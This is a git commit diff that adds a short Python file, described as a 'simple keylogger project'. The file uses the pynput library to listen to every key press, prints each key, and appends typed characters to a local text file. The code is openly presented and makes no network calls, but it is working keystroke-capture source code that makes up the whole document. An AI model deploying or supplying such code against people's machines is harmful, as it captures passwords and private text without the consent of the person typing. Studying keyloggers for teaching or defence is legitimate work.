20f1daef8e8f8886e626df8de2239b58a9d26ef9
Pavan M <pavan.2003.m@gmail.com>
2024-07-30 23:34:07 +0530

    Initial commit

---
+++ Keylogger.py
@@ -0,0 +1,18 @@
+# simple keylogger project
+
+from pynput import keyboard
+
+
+def keyPressed(key):
+    print(str(key))
+    with open("Keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error getting the char")
+
+if __name__=="__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
